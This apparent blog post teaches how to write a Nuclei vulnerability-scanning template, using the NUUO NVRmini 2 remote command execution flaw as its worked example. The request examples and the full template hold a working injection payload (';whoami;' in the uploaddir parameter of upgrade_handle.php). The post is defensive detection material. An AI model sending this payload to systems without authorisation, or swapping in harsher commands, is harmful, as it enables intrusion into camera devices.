---
title: Development NUCLEI Template for Security Community!
published: true
---
## [](#header-3)What is Nuclei?

![](https://wallpaperaccess.com/full/199357.jpg)

Nuclei is used to send requests across targets based on a template leading to zero false positives and providing fast scanning on large number of hosts. Nuclei offers scanning for a variety of protocols including TCP, DNS, HTTP, File, etc. With powerful and flexible templating, all kinds of security checks can be modelled with Nuclei.

## [](#header-3)What is YAML? (redhat.com)

YAML is a data serialization language that is often used for writing configuration files. Depending on whom you ask, YAML stands for yet another markup language or YAML ain't markup language (a recursive acronym), which emphasizes that YAML is for data, not documents.


## [](#header-3)YAML Syntax

```js

# An employee record
name: Martin Devloper
job: Developer
skill: Elite
employed: True
foods:
   Apple
   Orange
   Strawberry
   Mango
languages:
  perl: Elite
  python: Elite
  pascal: Lame
education: |
  4 GCSEs
  3 A-Levels
  BSc in the Internet of Things

  ```


## [](#header-3)NUUO NVRMINI RCE 

The NUUO NVRMINI IP camera device provides a web application environment that allows users to manage the IP cameras. The related web application receives an input called uploaddir from the upgrade_handle.php file from the user. Input ';PAYLOAD;' When transmitted, it executes a system-level command. If the command is executed successfully, /upload_tmp_dir/ is displayed in the page source.

So, to detect this vulnerability, we will execute a command on the system and search for the word /upload_tmp_dir/ in HTTP Response.

Lets do request

```js
requests:
  - method: GET
    path:
      - "{{BaseURL}}/upgrade_handle.php?cmd=writeuploaddir&uploaddir=%27;whoami;%27"
```
Find matchs!
```js
matchers-condition: and
    matchers:
      - type: word
        words:
          - "/upload_tmp_dir/"
        part: body
```
All of them
```js
id: nuuo-nvrmini2-upgradehandlephp-rce

info:
  name: NUUO NVRmini 2 3.0.8 - Remote Code Execution
  author: 0x45d
  severity: critical
  tags: rce
  reference: |
    - https://www.exploit-db.com/exploits/45070
    - https://github.com/berkdsnr/NUUO-NVRMINI-RCE
    - https://packetstormsecurity.com/files/151573/NUUO-NVRmini-upgrade_handle.php-Remote-Command-Execution.html
requests:
  - method: GET
    path:
      - "{{BaseURL}}/upgrade_handle.php?cmd=writeuploaddir&uploaddir=%27;whoami;%27"

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "/upload_tmp_dir/"
        part: body

      - type: status
        status:
          - 200
```
## [](#header-3)References & Details

"url: https://www.exploit-db.com/exploits/45070"
"url: https://www.rapid7.com/db/modules/exploit/multi/http/nuuo_nvrmini_upgrade_rce/"
"url: https://github.com/projectdiscovery/nuclei/pull/399"
"url: https://github.com/projectdiscovery/nuclei-templates/blob/master/vulnerabilities/other/nuuo-nvrmini2-rce.yaml"

Follow me on twitter! @0x45d
